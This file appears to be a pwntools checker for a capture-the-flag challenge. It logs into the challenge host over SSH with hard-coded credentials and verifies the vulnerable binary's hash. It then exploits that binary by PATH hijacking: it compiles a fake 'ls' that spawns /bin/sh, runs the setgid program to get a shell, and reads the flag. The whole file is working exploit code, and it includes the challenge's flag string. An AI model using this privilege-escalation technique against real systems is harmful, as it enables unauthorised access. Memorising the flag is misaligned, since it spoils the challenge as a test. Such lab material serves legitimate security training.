#!/usr/bin/python3
from pwn import *
import os, hashlib
import random, string

host = "pwn1.ctf.insecurity-insa.fr"

def random_str():
    return ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(20)])

def alive():
    s = ssh(host=host, user="user4000", password="123", level="error")
    elf = '/tmp/' + random_str()
    s.download_file('/challenge/level1/vuln', local=elf)
    v = s.run("./vuln")
    ret = v.recvline(timeout=1)
    ret += v.recvline(timeout=1)
    ret += v.recvline(timeout=1)
    ret += v.recvline(timeout=1)
    assert(ret == b'The content of the current folder is : \ntotal 16\n-r--r----- 1 root level1ok   23 Mar 21 20:20 flag\n-rwxr-sr-x 1 root level1ok 7337 Mar 23 20:22 vuln\n')
    with open(elf, 'rb') as f:
        content = f.read()
    sha256_returned = hashlib.sha256(content).hexdigest()
    if sha256_returned != "8f5011dea3993254bd68e5434187e3d94ad916302f44822e2989baaf7e53c7d0":
        return False
    os.system("rm " + elf)
    return True


def exploitable():
    tmp = "/tmp/" + random_str()
    s = ssh(host=host, user="user4000", password="123", level="error")
    bash = s.run("bash")
    bash.sendline("mkdir -p " + tmp)
    bash.sendline("chmod 700 " + tmp)
    bash.sendline("chown user4000:user4000 " + tmp + " -R")
    tmp_ls_c = tmp + "/ls.c"
    tmp_ls_b = tmp + "/ls"
    bash.sendline("echo '#include <stdio.h>' > " + tmp_ls_c)
    bash.sendline("echo 'void main()' >> " + tmp_ls_c)
    bash.sendline("echo '{' >>  " + tmp_ls_c)
    bash.sendline("echo '  system(\"/bin/sh\");' >> " + tmp_ls_c)
    bash.sendline("echo '}' >> " + tmp_ls_c)
    bash.sendline("cd " + tmp)
    bash.sendline("gcc " + tmp_ls_c + " -o " + tmp_ls_b)
    bash.sendline("cd")
    bash.sendline('export PATH="' + tmp + ':$PATH"')
    bash.sendline('./vuln')
    bash.sendline('cat flag')
    res = bash.recvline(timeout=1)
    bash.sendline('exit')
    bash.sendline('rm -rf ' + tmp)
    for i in range(15):
        res = bash.recvline(timeout=1)
        if b'INSA{SySt3m_1s_3v1l_-}' in res:
            return True
    return False


if __name__ == "__main__":
    print(alive() and exploitable())
